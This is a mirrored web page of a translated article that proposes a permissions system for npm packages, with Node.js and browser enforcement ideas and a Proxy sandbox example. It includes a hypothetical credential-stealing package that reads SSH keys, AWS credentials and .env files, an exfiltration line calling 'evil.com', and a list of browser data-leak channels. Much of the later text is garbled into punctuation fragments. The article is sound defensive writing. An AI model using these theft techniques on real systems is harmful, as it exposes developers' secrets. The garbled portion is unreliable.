<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>There is an idea: permissions system for npm-packages</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A few days ago I first launched a calculator on a new phone and saw the following message: ‚ÄúThe calculator would like to access your contacts.‚Äù 


 At...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>There is an idea: permissions system for npm-packages</h1><div class="post__text post__text-html js-mediator-article">  A few days ago I first launched a calculator on a new phone and saw the following message: ‚ÄúThe calculator would like to access your contacts.‚Äù <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bc6/ab2/2fb/bc6ab22fbd46e2703b3d248480a389cf.png"></div><br>  At first, this message seemed a little sad to me (it looks like the calculator was lonely), but this case made me think ... <br><a name="habracut"></a><br>  What if, like applications for phones, npm-packages would need to declare the permissions necessary for their work?  With this approach, the package file <code>package.json</code> would look something like this: <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"fancy-logger"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"0.1.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: [<span class="hljs-string"><span class="hljs-string">"network"</span></span>],   <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: [<span class="hljs-string"><span class="hljs-string">"http"</span></span>, <span class="hljs-string"><span class="hljs-string">"fs"</span></span>] }, <span class="hljs-attr"><span class="hljs-attr">"etcetera"</span></span>: <span class="hljs-string"><span class="hljs-string">"etcetera"</span></span> }</code> </pre> <br>  On the <a href="http://npmjs.com/">npmjs.com</a> website <a href="http://npmjs.com/">, a</a> section of the package page with information on the permissions it needs might look like this. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/9ab/9e6/76d/9ab9e676da3e313c47d59e564afd21bc.png"></div><br>  <i>Such a section with information about permissions could have packages on the registry site npm</i> <br>  Such lists of permissions for a package could be a combination of the permissions of all its dependencies with its own permissions. <br><br>  One glance at the contents of the <code>permissions</code> section of the <code>fancy-logger</code> package could make the developer think about why the package that writes something to the console has access to the <code>http</code> module, and that it looks somewhat suspicious. <br><br>  What would be the world in which a similar permission system would be used for npm-packages?  Perhaps someone will not see the point in this, since he feels completely safe, for example, using only reliable packages from time-tested publishers.  So that everyone who reads this would feel vulnerable, here‚Äôs a short story. <br><br><h2>  <font color="#3AC1EF">A story about how I steal your environment variables.</font> </h2><br>  I wanted to create an npm package called <code>space-invaders</code> .  It was interesting to learn how to make games by writing a game that works in the console, and at the same time substantiate my point of view on the vulnerabilities associated with npm-packages. <br><br>  You could <code>npx space-invaders</code> this game with the following command: <code>npx space-invaders</code> .  After its launch, you could immediately start shooting at the aliens and kill time. <br><br>  You would like this game, you would share it with friends, they would like it too. <br><br>  All this looks very positive, but, entertaining you, the <code>space-invaders</code> will go about its business, namely the collection of some data.  She will gather information from <code>~/.ssh/</code> , <code>~/.aws/credentials</code> , from <code>~/.bash_profile</code> and other similar places, read the contents of all <code>.env</code> files that she can reach, including <code>process.env</code> , look in to the git configuration (in order to find out - whose information it collects), and then it will send it all to my server. <br><br>  I did not write such a game, but for some time I have been feeling uneasy, and when I run the <code>npm install</code> command, I reflect on how vulnerable my system is.  Now, looking at the progress indicator of the installation, I think about how many standard folders and files on my laptop, the contents of which should not fall into the wrong hands. <br><br>  And it‚Äôs not just about my workspace.  For example, I don‚Äôt even know if there are data in some environmental variables of my site assembly system for connecting to the production server database.  If there is such data somewhere, then you can imagine a situation in which the malicious npm-package installs a script in the system designed to connect to my working database.  Then this script executes the <code>SELECT * from users</code> command, then <code>http.get('http://evil.com/that-data')</code> .  Maybe it was precisely because of the possibility of such attacks that I encountered advice that passwords should not be stored in databases as plain text? <br><br>  All this looks rather frightening, and, most likely, is already happening (although it is impossible to say for sure whether it is happening or not). <br><br>  On this, perhaps, we stop talking about the consequences of the theft of important data.  Let's return to the topic of permissions for npm-packages. <br><br><h2>  <font color="#3AC1EF">Locking permission changes</font> </h2><br>  I guess it would be great to be able to see the permissions required by the package when browsing the npm site.  But it should be noted that the opportunity to see the resolution is good only when applied to a specific point in time, but in reality, this does not solve the real problem. <br><br>  During a recent incident in npm, someone first published a patch version of a package with a malicious code, then published a minor version, from which the malicious code had already been deleted.  The time between these two events was enough for a lot of users of a dangerous package to get in danger. <br><br>  That is the problem.  Not packages that are created by malware and remain like this all the time.  The problem is that in a seemingly reliable package you can imperceptibly add something bad and after a while remove it from it. <br><br>  As a result, we can say that we need a mechanism to block the set of permissions received by packets. <br><br>  Perhaps it will be something like the file <code>package-permissions.json</code> , which sets permissions for Node.js and for the browser and contains a list of packages that need these permissions.  With this approach, it would be necessary to list all the packages in such a file, and not just those that are in the <code>dependencies</code> section of the project <code>package.json</code> file. <br><br>  This is what <code>package-permissions.json</code> might look like. <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"http"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"express"</span></span>,     <span class="hljs-string"><span class="hljs-string">"stream-http"</span></span>   ],   <span class="hljs-attr"><span class="hljs-attr">"fs"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"fs-extra"</span></span>,     <span class="hljs-string"><span class="hljs-string">"webpack"</span></span>,     <span class="hljs-string"><span class="hljs-string">"node-sass"</span></span>   ] }, <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"network"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"whatwg-fetch"</span></span>,     <span class="hljs-string"><span class="hljs-string">"new-relic"</span></span>   ] } }</code> </pre> <br>  A real version of such a file could contain much more package entries. <br><br>  Now imagine that once you update a package with two hundred dependencies that will also be updated.  For one of these dependencies, a patch version was published, which suddenly needed access to the <code>http</code> Node.js module. <br><br>  If this happens, the <code>npm install</code> command will fail with the following error: ‚ÄúThe <code>add-two-number</code> package required by the <code>fancy-logger</code> package requested access to the <code>http</code> Node.js module.  Run the <code>npm update-permissions add-two-numbers</code> command to allow this, and then run the <code>npm install</code> command again. ‚Äù <br><br>  Here, <code>fancy-logger</code> is the package that is in your <code>package.json</code> file (it is assumed that you are familiar with this package), and the package <code>add-two-numbers</code> is a <code>fancy-logger</code> dependency that you have never heard of. <br><br>  Of course, even if there is a file in the system to ‚Äúblock‚Äù dependencies, some developers will, without thinking about anything, confirm the new permissions.  But, at a minimum, the change in <code>package-permissions.json</code> will be seen in the pull request, that is, there will be a chance that another developer, more responsible, will pay attention to this. <br><br>  Further, changes in the requested permissions would require the npm registry itself to notify the authors of packages when the situation changes somewhere in the dependencies tree of their packages.  Perhaps - this will be done by e-mail of approximately the following content: <br><br>  ‚ÄúHello, the author of <code>fancy-logger</code> .  We inform you that <code>add-two-number</code> , the package you use, has requested permission to work with the <code>http</code> module.  The permissions of your package shown at <code>npmjs.com/package/fancy-logger</code> have been updated accordingly. ‚Äù <br><br>  This, of course, will add cases to the authors of the packages and to npm itself, but these cases will be worthy of spending a little time on them.  In this case, the author of <code>add-two-numbers</code> can be quite sure that if he requests permission to work with the <code>http</code> module, this will trigger a multitude of ‚Äúalarms‚Äù all over the world. <br><br>  That is what we need.  Yes?  I hope that, as in the case of telephone applications, and even in the case of extensions for Chrome, packages that require less permissions will enjoy more user love than those that need an inexplicably high level of access to systems.  This, in turn, will force package authors to think very well when choosing the permissions necessary for their development. <br><br>  Suppose that in npm decided to enter the system permissions.  On the first day of launching such a system, all packages will be considered to require full permissions (such a decision will be made later - in cases where the <code>permissions</code> section is missing from <code>package.json</code> ). <br><br>  An author of a package who wants to declare that his package does not require special permissions will be interested in adding <code>permissions</code> to <code>package.json</code> as an empty object.  And, if the authors of the packages are sufficiently interested in that dependency permissions do not ‚Äúburden‚Äù their packages, they will try to ensure that these dependency packages also do not require special permissions, for example, by making corresponding pull requests in the dependency repository. <br><br>  In addition, each author of the package will seek to reduce the risk of the vulnerability of his package when hacking one of its dependencies.  Therefore, if the authors of the packages use dependencies that require permissions, which, it would seem, are not needed by them, they will have an incentive to switch to using other packages. <br><br>  And in the case of developers who use npm-packages when creating applications, this will force them to pay particular attention to the packages used in their projects, choosing mainly those that do not require special permissions.  In this case, of course, some packages, for objective reasons, will require permits that can cause problems, but such packages are likely to be under special control of the developers. <br><br>  Perhaps in some way something like <a href="https://greenkeeper.io/">Greenkeeper</a> can help in solving all these problems. <br><br>  And finally, the <code>package-permissions.json</code> file will provide an easy-to-read summary for a security professional who assesses potential holes in the application and will allow you to ask specific questions about the disputed packages and their permissions. <br><br>  As a result, hopefully, this simple <code>permissions</code> property can be widely distributed among approximately 800,000 npm packages and make npm safer. <br><br>  Of course, this will not prevent possible attacks.  Just as the permissions requested by mobile applications do not make it impossible to create malicious mobile applications distributed through official sites.  But this will narrow the ‚Äúattack surface‚Äù to packages that explicitly request permission to perform certain actions that may pose a threat to computer systems.  In addition, it will be interesting to know what percentage of packages do not need any special permissions at all. <br><br>  This is what the mechanism for working with permissions for npm packages that I invented looks like.  If this idea becomes a reality, then we can either rely on the fact that attackers will honestly describe their packages, declaring permissions, or combine the system of declaring permissions with the mechanism of forced restriction of packages in accordance with the permissions requested by them.  This is an interesting question.  Let's look at it as applied to the Node.js environment and browsers. <br><br><h2>  <font color="#3AC1EF">Forced restriction of package capabilities according to the permissions they requested in Node.js</font> </h2><br>  Here I see two possible options for applying such restrictions. <br><br><h3>  <font color="#3AC1EF">‚ñç Option 1: a special npm-package, forcing security measures</font> </h3><br>  Imagine a package created and maintained by npm (or some other organization, equally authoritative and far-sighted).  Let this package be called <code>@npm/permissions</code> . <br><br>  Such a package would either be included in the application code by the first import command, or applications would be launched with a command like <code>node -r @npm/permissions index.js</code> . <br><br>  A package would override other import commands so that they do not violate the permissions stated in the <code>permissions</code> section of the <code>package.json</code> files of other packages.  If the author of a certain package <code>lovely-logger</code> did not declare the need for this package in the Node.js <code>http</code> module, this means that such a package will not be able to access this module. <br><br>  Strictly speaking, locking entire Node.js modules in this way is not ideal.  For example, the npm <code>methods</code> package loads the Node.js <code>http</code> module, but does not send any data with it.  It simply takes the <code>http.METHODS</code> object, converts its name to lower case, and exports it as a classic npm package.  Now this package looks like an excellent target for an attacker - he has 6 million downloads per week, while he has not changed for 3 years.  I could write to the authors of this package and invite them to give me his repository. <br><br>  Considering the <code>methods</code> package, it would be better to assume that it does not need the <code>network</code> permission, but not the permission giving access to the <code>http</code> module.  Then this restriction can be fixed by means of an external mechanism and neutralize any attempts by this packet to send some data from the systems in which it operates. <br><br>  An imaginary <code>@npm/permissions</code> package could also restrict access from one package to any other packages that were not listed as its dependencies.  This will prevent the package, for example, from importing something like <code>fs-extra</code> and <code>request</code> , and using the capabilities of these packages to read data from the file system and send the read data to the attacker. <br><br>  Similarly, it may be useful to distinguish between "internal" and "external" disk access.  I‚Äôm quite happy with the fact that the <code>node-sass</code> needs access to materials located within the directory of my project, but I see no reason why this package needs access to something outside this directory. <br><br>  Perhaps at the very beginning of the introduction of the permissions system, the <code>@npm/permissions</code> package will need to be added to projects manually.  Perhaps, during the transition period, during the elimination of the inevitable malfunctions, this is the only reasonable approach to using such a mechanism.  But to ensure real security, it is necessary that this package be rigidly embedded in the system, as it will be necessary to take into account the permissions and when running the package installation scripts. <br><br>  Then, most likely, it turns out that a simple command like <code>"enforcePermissions": true</code> in the project <code>package.json</code> file will tell npm that any scripts would be launched with the forced use of the permissions declared by them. <br><br><h3>  <font color="#3AC1EF">‚ñç Option 2: Safe Mode Node.js</font> </h3><br>  The special Node.js mode of operation focused on an increased level of security will obviously require more serious changes.  But perhaps in the long run, the Node.js platform itself will be able to enforce the restrictions imposed by the permissions declared by each package. <br><br>  On the one hand, I know that those who develop the Node.js platform strive to solve the tasks of this platform, and my ideas about the safety of npm packages go beyond the scope of their interests.  After all, in the end, npm is just a technology that accompanies Node.js.  On the other hand, Node.js developers are interested in ensuring that corporate users would feel confident working with this platform, and security, I think, is one of those Node.js parties that should not be taken care of by the ‚Äúcommunity‚Äù. <br><br>  So, for now everything that we talked about looked pretty simple and it came down to the system monitoring in one way or another the capabilities used by the modules during the operation of Node.js. <br><br>  Now let's talk about browsers.  Here, everything looks not so clear and understandable. <br><br><h2>  <font color="#3AC1EF">Forced restriction of package capabilities in accordance with the permissions requested by them in browsers</font> </h2><br>  At first glance, the forced restriction of the capabilities of packages in browsers looks even simpler, since the code running in the browser can do little in relation to the operating system on which the browser is based.  In fact, in the case of browsers, you only have to worry about the possibility of packets for transmitting data to unusual addresses. <br><br>  The problem here is that there are countless ways to send data from the user's browser to the attacker's server. <br><br>  This is called exfiltration or data leakage, and if you ask a security professional how to avoid it, he will, with the air of the person who invented the powder, tell you to stop using npm. <br><br>  I believe that for packages running in browsers, you need to pay attention to only one resolution - the one that is responsible for the ability to work with the network.  Let's call it <code>network</code> .  There may be other permissions in this environment (like those that regulate access to the DOM or local storage), but here I assume that our main concern is the possibility of data leakage. <br><br>  Data from the browser can "lead" in many ways.  Here are what I could remember in 60 seconds: <br><br><ul><li>  API <code>fetch</code> . </li><li>  Web sockets. </li><li>  WebRTC technology. </li><li>  <code>EventSource</code> constructor. </li><li>  API <code>XMLHttpRequest</code> . </li><li>  Setting the <code>innerHTML</code> property of various elements (you can create new elements). </li><li>  Creating an image object with the <code>new Image()</code> command <code>new Image()</code> image <code>src</code> property can serve as a means of exfiltration of data) </li><li>  Installation of <code>document.location</code> , <code>window.location</code> , and so on. </li><li>  Change the <code>src</code> properties of an existing image, an <code>iframe</code> element, or something like that. </li><li>  Changes to the <code>target</code> property of the <code>&lt;form&gt;</code> element. </li><li>  Using a cleverly constructed string to access any of the mechanisms described above or to access something in <code>top</code> or <code>self</code> instead of <code>windows</code> . </li></ul><br>  It should be noted that a good content security policy (CSP, Content Security Policy) can neutralize some of these threats, but does not apply to all of them.  If someone can fix me, I will be happy, but I believe that you can never rely on the fact that CSP will completely protect you from data leakage.  One person once told me that CSP provides almost complete protection against a huge number of threats.  To this I replied that it is impossible to be a little pregnant, and since then we have not communicated with this person. <br><br>  If you wisely search for ways to steal data from the browser, then I‚Äôm sure that it‚Äôs quite realistic to make a fairly comprehensive list of these methods. <br><br>  Now we need to find a mechanism to deny access to the use of features from such a list. <br><br>        Webpack (,    <code>@npm/permissions-webpack-plugin</code> ),     : <br><br><ul><li>         <code>browser</code>  <code>package-permissions.json</code>   ,  npm-      (  -  ,  ). </li><li>  ,   ,     ,        API,        . </li></ul><br> (,       Parcel, Rollup, Browserify     ). <br><br> , ,     -.    ,          ,        , , ,        . <br><br>   ,        ( Lodash, Moment,   ),       .        . <br><br>            . <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   (),   ,    function bigFrameworkWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //      const firstDiv = document.querySelector('div'); //    }, }; return module; } //   ( ),   ,    function smallUtilWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //  !     const firstDiv = document.querySelector('div'); //    }, }; return module; } const restrictedWindow = new Proxy(window, { get(target, prop, receiver) {   if (prop === 'document') {     return new Proxy(target.document, {       get(target, prop, receiver) {         if (prop === 'createElement') {           return new Proxy(window.document.createElement, {             apply(target, thisArg, argumentsList) {               if (['script', 'img', 'audio', 'and-so-on'].includes(argumentsList[0])) {                 console.error('A module without permissions attempted to create a naughty element');                 return false;               }               return target.apply(window.document, argumentsList);             },           });         }         const result = Reflect.get(target, prop, receiver);         if (typeof result === 'function') return result.bind(target);         return result;       },     });   }   return Reflect.get(target, prop, receiver); }, }); const bigFramework = bigFrameworkWrapper(window); bigFramework.doSomething(); //   const smallUtil = smallUtilWrapper(restrictedWindow); smallUtil.doSomething(); // ! "A module without permissions attempted to create a naughty element"</span></span></code> </pre> <br>  <code>function bigFrameworkWrapper(newWindow) {</code>  <code>function smallUtilWrapper(newWindow) {</code> ‚Äî  ,    .  ¬´¬ª      . <br><br>   <code>const newScript = document.createElement('script'); //  !</code>  ,         ‚Äî    <code>script</code> . <br><br>   <code>const bigFramework = bigFrameworkWrapper(window);</code>  <code>const smallUtil = smallUtilWrapper(restrictedWindow);</code>  ¬´¬ª     . ,      ,    . <br><br>   <code>const restrictedWindow = new Proxy(window, {</code>    <code>window</code> ,    ,     <code>window</code> ,   ,           <code>window.document.createElement</code>    DOM  . <br><br>     <code>Proxy</code> . <br><br>       .         ,           . <br><br> ,   ,       API,      .   ,     ,   ,  ,  ,     ,        ,    ,   ,     ,  ¬´¬ª   . <br><br>      ,   ,     ,   -     . <br><br> , ,  ,        ,       <code>Proxy</code> . ,      90% ,   .        ,         ,   . ,    -   ,             ,   ,  . <br><br>  ,   , ,       ,     ,              Node.js       . <br><br><h2> <font color="#3AC1EF"> </font> </h2><br>  ,   ,    HTTP   ,  , ,          -.   . <br><br>     -,   ,  ,              .    <code>iframe</code> ,    .     <code>sandbox</code> ,    ,     .  ,    ,   ,     -. <br><br> ,   ,     <code>sandbox</code>  <code>&lt;script&gt;</code> .     : <code>&lt;script src="/some-package.js" sandbox="allow-exfiltration allow-whatevs"&gt;&lt;script&gt;</code> .      ,       ,      ,      - <code>create-react-app</code> ,   1.4   ,          . <br><br>     ,            npm  ,      . <br><br>  ,      -  . <br><br> ,  ,    -    ¬´ ...¬ª,     ,   ,       ? <br><br><h2>  <font color="#3AC1EF">Results</font> </h2><br>  ,   ,     , ,              .      ,  90% ,   ,    ,    10% ‚Äî ,    . <br><br> ,          ,           -  . <br><br>  <b>Dear readers!</b>   ,  ,       npm,   -? <br><br> <a href="https://ruvds.com/ru-rub/"><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div><p>Source: <a href="https://habr.com/ru/post/433010/">https://habr.com/ru/post/433010/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../432998/index.html">Christmas story</a></li>
<li><a href="../433000/index.html">Compiling Kotlin: JetBrains VS ANTLR VS JavaCC</a></li>
<li><a href="../433002/index.html">Go yourself on ... or the rules of communication in a team</a></li>
<li><a href="../433004/index.html">Reliable cloud migration strategy in 2019: 7 tips</a></li>
<li><a href="../433008/index.html">USB devices - "sudden" threat</a></li>
<li><a href="../433012/index.html">Maybe I'm only alive because of her: why do apnea patients rely on a program written by a hacker?</a></li>
<li><a href="../433014/index.html">Jokes about the recent astronauts in outer space</a></li>
<li><a href="../433016/index.html">Interface changes, multi-layer animation and structured visual chaos: a review of web trends for 2019</a></li>
<li><a href="../433018/index.html">UDB. What is it? Part 2. Datapath</a></li>
<li><a href="../433030/index.html">Live: front end performance</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>